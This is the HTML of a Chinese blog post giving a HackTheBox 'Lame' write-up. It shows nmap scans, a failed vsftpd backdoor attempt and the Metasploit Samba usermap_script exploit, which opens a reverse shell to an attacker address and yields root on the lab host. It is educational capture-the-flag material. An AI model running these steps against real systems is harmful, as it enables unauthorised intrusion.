@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang>
+  <head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+<meta name="theme-color" content="#f8f5ec">
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="HTB Lame Writeup"><meta name="keywords" content="sec|secruity|blog"><link rel="alternate" href="/atom.xml" title="danta"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.1">
+<link rel="canonical" href="https://cxliker.github.io/2019/12/18/HTB-Lame-Writeup/">
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css"><link rel="stylesheet" type="text/css" href="/lib/nprogress/nprogress.min.css">
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.1">
+
+<script id="baidu_analytics">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?1fb3396bc01d62b8be6fcb651441065c";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script><script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script src="//cdn1.lncld.net/static/js/3.1.1/av-min.js"></script>
+  <script id="leancloud">
+    AV.init({
+      appId: "92CcA9DvqYFSomQnzdApeHt9-gzGzoHsz",
+      appKey: "gAPpmDXQmTGE9s9a3eU4nJ0h"
+    });
+  </script><script>
+  window.config = {"leancloud":{"app_id":"92CcA9DvqYFSomQnzdApeHt9-gzGzoHsz","app_key":"gAPpmDXQmTGE9s9a3eU4nJ0h"},"toc":true,"fancybox":true,"pjax":true,"latex":false};
+</script>
+
+    <title>HTB Lame Writeup - danta</title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">danta</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/archives/">
+        <li class="mobile-menu-item">归档
+          </li>
+      </a><a href="/about">
+        <li class="mobile-menu-item">关于
+          </li>
+      </a><a href="/atom.xml">
+        <li class="mobile-menu-item">RSS
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">danta</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            归档
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about">
+            关于
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/atom.xml">
+            RSS
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">HTB Lame Writeup
+        </h1>
+
+      <div class="post-meta">
+        <span class="author">
+          danta
+        </span>
+        <span class="post-time">
+          2019-12-18 22:44
+        </span><span class="post-visits" data-url="/2019/12/18/HTB-Lame-Writeup/" data-title="HTB Lame Writeup">
+          Visits 0
+        </span>
+        </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-信息收集"><span class="toc-text">0x01 信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-GetShell"><span class="toc-text">0x02 GetShell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#FTP"><span class="toc-text">FTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB"><span class="toc-text">SMB</span></a></li></ol></li></ol>
+    </div>
+  </div><div class="post-content"><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>HackTheBox 同名靶机</p>
+<h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ports=$(nmap -PN -p- --min-rate=1000 -T4 10.10.10.3 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ','| sed s/,$//)</span></span><br><span class="line"><span class="comment"># nmap -Pn -p$ports -sC -sV 10.10.10.3</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-18 09:24 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.3</span><br><span class="line">Host is up (0.44s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 2.3.4</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_ftp-bounce: bounce working!</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:<span class="built_in">cd</span> (DSA)</span><br><span class="line">|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_ms-sql-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_smb-security-mode: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 96.92 seconds</span><br></pre></td></tr></table></figure>
+
+<p>匿名登录smb失败，匿名登录ftp成功，但啥也没有。</p>
+<h1 id="0x02-GetShell"><a href="#0x02-GetShell" class="headerlink" title="0x02 GetShell"></a>0x02 GetShell</h1><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ searchsploit vsftpd 2.3.4                                                                                                                                                                      [22:41:28]</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                 |  Path</span><br><span class="line">                                                                                                                                               | (/usr/<span class="built_in">local</span>/opt/exploitdb/share/exploitdb/)</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line">vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                         | exploits/unix/remote/17491.rb</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>
+
+<p>转而使用msf，但利用EXP失败：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search vsftpd</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                  Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                  ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/ftp/vsftpd_234_backdoor):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT   21               yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; <span class="built_in">set</span> rhosts 10.10.10.3</span><br><span class="line">rhosts =&gt; 10.10.10.3</span><br><span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)</span><br><span class="line">[*] 10.10.10.3:21 - USER: 331 Please specify the password.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure>
+
+<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search samba</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#   Name                                                 Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -   ----                                                 ---------------  ----       -----  -----------</span><br><span class="line">   0   auxiliary/admin/smb/samba_symlink_traversal                           normal     No     Samba Symlink Directory Traversal</span><br><span class="line">   1   auxiliary/dos/samba/lsa_addprivs_heap                                 normal     No     Samba lsa_io_privilege_set Heap Overflow</span><br><span class="line">   2   auxiliary/dos/samba/lsa_transnames_heap                               normal     No     Samba lsa_io_trans_names Heap Overflow</span><br><span class="line">   3   auxiliary/dos/samba/read_nttrans_ea_list                              normal     No     Samba read_nttrans_ea_list Integer Overflow</span><br><span class="line">   4   auxiliary/scanner/rsync/modules_list                                  normal     No     List Rsync Modules</span><br><span class="line">   5   auxiliary/scanner/smb/smb_uninit_cred                                 normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State</span><br><span class="line">   6   exploit/freebsd/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)</span><br><span class="line">   7   exploit/linux/samba/chain_reply                      2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)</span><br><span class="line">   8   exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load</span><br><span class="line">   9   exploit/linux/samba/lsa_transnames_heap              2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow</span><br><span class="line">   10  exploit/linux/samba/setinfopolicy_heap               2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow</span><br><span class="line">   11  exploit/linux/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Linux x86)</span><br><span class="line">   12  exploit/multi/samba/nttrans                          2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow</span><br><span class="line">   13  exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba <span class="string">"username map script"</span> Command Execution</span><br><span class="line">   14  exploit/osx/samba/lsa_transnames_heap                2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow</span><br><span class="line">   15  exploit/osx/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)</span><br><span class="line">   16  exploit/solaris/samba/lsa_transnames_heap            2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow</span><br><span class="line">   17  exploit/solaris/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)</span><br><span class="line">   18  exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection</span><br><span class="line">   19  exploit/unix/misc/distcc_exec                        2002-02-01       excellent  Yes    DistCC Daemon Command Execution</span><br><span class="line">   20  exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution</span><br><span class="line">   21  exploit/windows/fileformat/ms14_060_sandworm         2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution</span><br><span class="line">   22  exploit/windows/http/sambar6_search_results          2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow</span><br><span class="line">   23  exploit/windows/license/calicclnt_getconfig          2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow</span><br><span class="line">   24  exploit/windows/smb/group_policy_startup             2015-01-26       manual     No     Group Policy Script Execution From Shared Resource</span><br><span class="line">   25  post/linux/gather/enum_configs                                        normal     No     Linux Gather Configurations</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/multi/samba/usermap_script</span><br><span class="line">msf5 exploit(multi/samba/usermap_script) &gt; <span class="built_in">set</span> rhosts 10.10.10.3</span><br><span class="line">rhosts =&gt; 10.10.10.3</span><br><span class="line">msf5 exploit(multi/samba/usermap_script) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 10.10.14.9:4444</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: <span class="built_in">echo</span> g683nZMOwtlWKtwA;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket B</span><br><span class="line">[*] B: <span class="string">"sh: line 2: Connected: command not found\r\nsh: line 3: Escape: command not found\r\ng683nZMOwtlWKtwA\r\n"</span></span><br><span class="line">[*] Matching...</span><br><span class="line">[*] A is input...</span><br><span class="line">[*] Command shell session 1 opened (10.10.14.9:4444 -&gt; 10.10.10.3:50738) at 2019-12-18 23:49:50 +0800</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+
+      </div>
+      <footer class="post-footer">
+        
+        <nav class="post-nav"><a class="next" href="/2019/12/16/HTB-Beep-Writeup/">
+        <span class="next-text nav-default">HTB Beep Writeup</span>
+        <span class="prev-text nav-mobile">下一篇</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"><div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:cxliker@qq.com" class="iconfont icon-email" title="email"></a>
+        <a href="https://github.com/cxliker" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://hexo.io/">Hexo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2018 - 2019<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">danta</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'https://cxliker.github.io/2019/12/18/HTB-Lame-Writeup/';
+        this.page.identifier = '2019/12/18/HTB-Lame-Writeup/';
+        this.page.title = 'HTB Lame Writeup';
+    };
+    (function() {
+    var d = document, s = d.createElement('script');
+
+    s.src = '//cxliker.disqus.com/embed.js';
+
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();  
+  </script><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/lib/pjax/jquery.pjax.min.js"></script>
+  <script type="text/javascript" src="/lib/nprogress/nprogress.min.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.1"></script>
+</body>
+</html>
